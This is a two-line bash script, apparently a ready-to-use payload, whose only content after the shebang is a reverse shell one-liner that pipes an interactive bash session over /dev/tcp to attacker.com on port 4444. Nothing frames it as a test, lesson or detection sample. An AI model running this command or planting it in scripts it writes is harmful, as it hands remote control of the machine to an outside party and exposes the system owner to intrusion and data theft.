#!/bin/bash
bash -i >& /dev/tcp/attacker.com/4444 0>&1
